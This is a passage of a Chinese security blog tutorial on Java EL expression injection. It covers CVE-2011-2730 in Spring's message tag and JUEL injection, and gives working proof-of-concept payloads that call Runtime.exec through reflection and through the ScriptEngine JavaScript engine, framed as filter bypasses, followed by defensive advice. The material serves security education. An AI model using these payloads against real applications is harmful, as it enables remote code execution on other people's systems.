+<p><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/edit/master/spring-webmvc/src/main/resources/META-INF/spring.tld">https://github.com/spring-projects/spring-framework/edit/master/spring-webmvc/src/main/resources/META-INF/spring.tld</a></p>
+<p>spring提供的message标签，其中的text属性支持el表达式，可导致el注入，我们使用如下测试代码</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ghtwf01</span><br><span class="line">  Date: <span class="number">2020</span>/<span class="number">12</span>/<span class="number">15</span></span><br><span class="line">  Time: <span class="number">2</span>:<span class="number">41</span> 上午</span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ taglib uri=<span class="string">&quot;/WEB-INF/spring.tld&quot;</span> prefix=<span class="string">&quot;spring&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL Study&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;spring:message text=<span class="string">&quot;$&#123;param.a&#125;&quot;</span>&gt;&lt;/spring:message&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接传入a为${applicationScope}即可获取webRoot，同样传入命令执行payload即可RCE</p>
+<h2 id="Java代码中的EL注入——JUEL"><a href="#Java代码中的EL注入——JUEL" class="headerlink" title="Java代码中的EL注入——JUEL"></a>Java代码中的EL注入——JUEL</h2><p>EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中， 并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用。</p>
+<p>也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。</p>
+<p>JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</p>
+<p>需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7</p>
+<p>利用反射调用Runtime类方法实现命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import de.odysseus.el.ExpressionFactoryImpl;</span><br><span class="line">import de.odysseus.el.util.SimpleContext;</span><br><span class="line">import javax.el.ExpressionFactory;</span><br><span class="line">import javax.el.ValueExpression;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();</span><br><span class="line">        SimpleContext simpleContext = new SimpleContext();</span><br><span class="line">        String exp = &quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;open -a Calculator&#x27;)&#125;&quot;;</span><br><span class="line">        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);</span><br><span class="line">        System.out.println(valueExpression.getValue(simpleContext));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行即可触发</p>
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8.png" alt="8"></p>
+<p>getValue方法解析了EL表达式并执行</p>
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9.png" alt="9"></p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>利用反射机制绕过</strong></p>
+<p>即前面Demo的POC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p>
+<p><strong>利用ScriptEngine调用JS引擎绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#x27;&#x27;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a Calculator&#x27;)&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
+<li><p>尽量不使用外部输入的内容作为EL表达式内容；</p>
+</li>
+<li><p>若使用，则严格过滤EL表达式注入漏洞的payload关键字；</p>
+</li>
+<li><p>如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://www.ghtwf01.com">ghtwf01</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ghtwf01.com/2020/12/16/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">https://www.ghtwf01.com/2020/12/16/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ghtwf01.com" target="_blank">ghtwf01</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://www.ghtwf01.cn/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/08/Fastjson%201.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson 1.2.22-1.2.24反序列化漏洞分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Fastjson 1.2.22-1.2.24反序列化漏洞分析</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/13/JNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/" title="JNDI注入高版本绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JNDI注入高版本绕过</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://www.ghtwf01.cn/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ghtwf01</div><div class="author-info__description">山不向我走来，我便向它走去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ghtwf01"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">EL表达式简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">EL表达式语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8E-%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text">[ ]与.运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">操作符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.4.</span> <span class="toc-text">隐式对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pageContext%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.4.1.</span> <span class="toc-text">pageContext对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scope%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.4.2.</span> <span class="toc-text">Scope对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E5%A4%96%E4%B8%80%E4%BA%9B%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.4.3.</span> <span class="toc-text">另外一些隐式对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.</span> <span class="toc-text">EL表达式函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%B0%83%E7%94%A8Java%E6%96%B9%E6%B3%95"><span class="toc-number">2.6.</span> <span class="toc-text">EL表达式调用Java方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSP%E4%B8%AD%E5%90%AF%E7%94%A8-x2F-%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">JSP中启用&#x2F;禁用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">全局禁用EL表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E6%96%87%E4%BB%B6%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">单个文件禁用EL表达式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">EL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2011-2730-Spring%E6%A0%87%E7%AD%BEEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2011-2730 Spring标签EL表达式漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84EL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94JUEL"><span class="toc-number">4.2.</span> <span class="toc-text">Java代码中的EL注入——JUEL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.1.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.2.</span> <span class="toc-text">防御方法</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/09/KMS-%E4%BA%91%E6%97%B6%E4%BB%A3%E4%B8%8B%E7%9A%84%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/" title="KMS-云时代下的密钥管理服务">KMS-云时代下的密钥管理服务</a><time datetime="2023-05-09T04:53:43.000Z" title="发表于 2023-05-09 12:53:43">2023-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/11/07/excavator%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Emitmproxy%E7%9A%84%E6%8F%92%E4%BB%B6%E5%BC%8F%E8%A2%AB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/" title="excavator——基于mitmproxy的插件式被动安全漏洞扫描器">excavator——基于mitmproxy的插件式被动安全漏洞扫描器</a><time datetime="2022-11-07T04:53:43.000Z" title="发表于 2022-11-07 12:53:43">2022-11-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/09/24/%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="三层网络域渗透打靶记录">三层网络域渗透打靶记录</a><time datetime="2022-09-24T05:53:43.000Z" title="发表于 2022-09-24 13:53:43">2022-09-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/16/HackTheBox%E5%9F%9F%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94Forest/" title="HackTheBox域系列打靶记录——Forest">HackTheBox域系列打靶记录——Forest</a><time datetime="2022-03-16T04:53:43.000Z" title="发表于 2022-03-16 12:53:43">2022-03-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/18/Kubernetes%E5%A4%A7%E5%9E%8B%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/" title="Kubernetes大型分布式集群环境搭建小记">Kubernetes大型分布式集群环境搭建小记</a><time datetime="2022-01-18T05:53:43.000Z" title="发表于 2022-01-18 13:53:43">2022-01-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By ghtwf01</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
